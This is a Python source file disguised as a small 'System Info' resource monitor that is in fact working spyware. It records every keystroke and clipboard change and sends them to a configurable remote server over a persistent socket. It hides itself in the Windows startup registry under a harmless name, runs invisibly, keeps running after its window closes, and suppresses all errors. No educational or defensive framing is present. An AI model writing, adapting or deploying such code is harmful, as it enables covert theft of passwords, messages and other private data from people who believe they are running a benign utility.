import tkinter as tk
import psutil
import threading
import time
import queue
import socket
import pyperclip
from pynput import keyboard
import struct
import multiprocessing
import sys
import os

# --- Configuration ---
SERVER_HOST = '127.0.0.1'  # CHANGE: Set to the Server's IP address
SERVER_PORT = 9998
CLIPBOARD_CHECK_INTERVAL = 1.0
RECONNECT_DELAY = 5.0
# --- End Configuration ---


def send_message(sock, message):
    """
    Helper function to send data over a socket.
    Prefixes the payload with a 4-byte integer representing the message length.
    """
    try:
        encoded = message.encode('utf-8')
        sock.sendall(struct.pack('!I', len(encoded)))
        sock.sendall(encoded)
        return True
    except (socket.error, OSError):
        return False


def monitor_clipboard(local_queue):
    """Continuously checks the system clipboard for changes and queues new content."""
    last_content = None
    while True:
        try:
            current = pyperclip.paste()
            if current and current != last_content:
                last_content = current
                local_queue.put(f"CLIPBOARD:{current}")
        except Exception:
            pass
        time.sleep(CLIPBOARD_CHECK_INTERVAL)


def handle_key_press(key, local_queue):
    """Callback function triggered whenever a key is pressed."""
    try:
        key_repr = key.char
    except AttributeError:
        # Handles special keys (e.g., Enter, Shift, Space)
        key_repr = f"<{key.name}>"
    if key_repr:
        local_queue.put(f"KEY:{key_repr}")


def keyboard_listener_thread(local_queue):
    """Starts the global keyboard listener."""
    with keyboard.Listener(on_press=lambda k: handle_key_press(k, local_queue)) as listener:
        listener.join()


def add_to_autostart():
    """
    Automatically registers the program in the Windows Registry to run on startup.
    Appends the 'hide' parameter to ensure it runs silently in the background.
    """
    if os.name != 'nt':  # Execute only on Windows
        return

    try:
        import winreg

        # Determine the correct execution command based on how the script is run
        if getattr(sys, 'frozen', False):
            # Running as a compiled EXE (e.g., via PyInstaller)
            cmd = f'"{sys.executable}" hide'
        else:
            # Running as a standard .py script -> Use pythonw.exe to run invisibly
            python_dir = os.path.dirname(sys.executable)
            pythonw = os.path.join(python_dir, "pythonw.exe")
            script_path = os.path.abspath(sys.argv[0])

            if os.path.exists(pythonw):
                cmd = f'"{pythonw}" "{script_path}" hide'
            else:
                cmd = f'"{sys.executable}" "{script_path}" hide'

        # Register in the Windows Autostart Registry
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = "SystemInfo"  # Display name in the Task Manager startup tab

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)

    except Exception:
        pass  # Fail silently if registry access is denied


def run_background_tasks():
    """Main execution loop for background monitoring and network communication."""
    send_queue = queue.Queue()

    # Start independent worker threads
    threading.Thread(target=monitor_clipboard, args=(send_queue,), daemon=True).start()
    threading.Thread(target=keyboard_listener_thread, args=(send_queue,), daemon=True).start()

    # Persistent network connection loop
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(5)
        
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            client_socket.settimeout(None)  # Remove timeout once connected
            
            while True:
                # Blocks until data is available in the queue
                data = send_queue.get(block=True)
                if not send_message(client_socket, data):
                    break  # Break inner loop if sending fails to trigger a reconnect
                    
        except (socket.error, ConnectionRefusedError, OSError):
            pass
        finally:
            client_socket.close()
            time.sleep(RECONNECT_DELAY)


# === GUI Application (Main Process) ===
class SystemInfoApp:
    def __init__(self, root):
        self.root = root
        self.gui_running = True
        self.root.title("System Info")
        self.root.resizable(False, False)

        # UI Components
        self.cpu_label = tk.Label(root, text="CPU: - %", font=("Arial", 12))
        self.cpu_label.pack(pady=5, padx=10, anchor="w")
        
        self.ram_label = tk.Label(root, text="RAM: - %", font=("Arial", 12))
        self.ram_label.pack(pady=5, padx=10, anchor="w")
        
        self.disk_label = tk.Label(root, text="Disk (/): - %", font=("Arial", 12))
        self.disk_label.pack(pady=5, padx=10, anchor="w")

        tk.Button(root, text="Exit", command=self.close_gui_only).pack(pady=10)

        # Start live updates
        threading.Thread(target=self.update_gui_info, daemon=True).start()
        self.root.protocol("WM_DELETE_WINDOW", self.close_gui_only)

    def format_bytes(self, b):
        """Converts raw byte values into human-readable formats."""
        if b < 1024: return f"{b} B"
        elif b < 1024**2: return f"{b/1024:.1f} KB"
        elif b < 1024**3: return f"{b/1024**2:.1f} MB"
        else: return f"{b/1024**3:.1f} GB"

    def update_gui_info(self):
        """Periodically polls the system resources and updates the UI."""
        while self.gui_running:
            try:
                self.cpu_label.config(text=f"CPU: {psutil.cpu_percent(interval=None):.1f} %")
                
                ram = psutil.virtual_memory()
                self.ram_label.config(text=f"RAM: {ram.percent:.1f} % ({self.format_bytes(ram.used)} / {self.format_bytes(ram.total)})")
                
                try:
                    self.disk_label.config(text=f"Disk (/): {psutil.disk_usage('/').percent:.1f} %")
                except FileNotFoundError:
                    self.disk_label.config(text="Disk (/): N/A")
            except Exception:
                self.gui_running = False
                break
            time.sleep(1)

    def close_gui_only(self):
        """Closes the GUI window without killing the background monitoring process."""
        self.gui_running = False
        self.root.destroy()


if __name__ == "__main__":
    # Required for multiprocessing to work seamlessly on Windows when compiled into an executable
    multiprocessing.freeze_support()

    # Automatically add to Windows startup registry (skipped if already running hidden)
    if "hide" not in sys.argv:
        add_to_autostart()

    # Launch background monitoring as an independent process
    bg_process = multiprocessing.Process(target=run_background_tasks, daemon=False)
    bg_process.start()

    # Check execution mode via command-line arguments
    if "hide" in sys.argv:
        # Prevent the main script from exiting, keeping the hidden background process alive
        bg_process.join() 
    else:
        # No "hide" parameter -> Launch the graphical user interface
        root = tk.Tk()
        app = SystemInfoApp(root)
        root.mainloop()